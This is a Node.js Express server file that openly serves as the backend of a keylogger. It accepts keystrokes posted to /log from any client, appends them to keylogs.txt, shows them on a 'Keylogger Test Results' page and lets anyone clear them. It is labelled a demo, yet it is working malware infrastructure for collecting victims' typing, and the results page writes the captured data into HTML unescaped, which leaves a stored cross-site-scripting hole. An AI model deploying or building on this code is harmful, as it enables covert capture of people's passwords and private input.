const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());

// Store logs in memory (for demo purposes)
let keyLogs = [];

app.post('/log', (req, res) => {
    const key = req.body.key;
    keyLogs.push(key);
    fs.appendFileSync('keylogs.txt', `${key}\n`);
    res.sendStatus(200);
});

app.get('/logs', (req, res) => {
    const logs = fs.readFileSync('keylogs.txt', 'utf-8');
    res.send(`
        <h1>Keylogger Test Results</h1>
        <pre>${logs}</pre>
        <form action="/clear-logs" method="POST">
            <button type="submit">Clear Logs</button>
        </form>
    `);
});

app.post('/clear-logs', (req, res) => {
    fs.writeFileSync('keylogs.txt', '');
    keyLogs = [];
    res.sendStatus(200);
});

app.listen(3000, '0.0.0.0', () => {
    console.log('Keylogger server running on http://localhost:3000');
});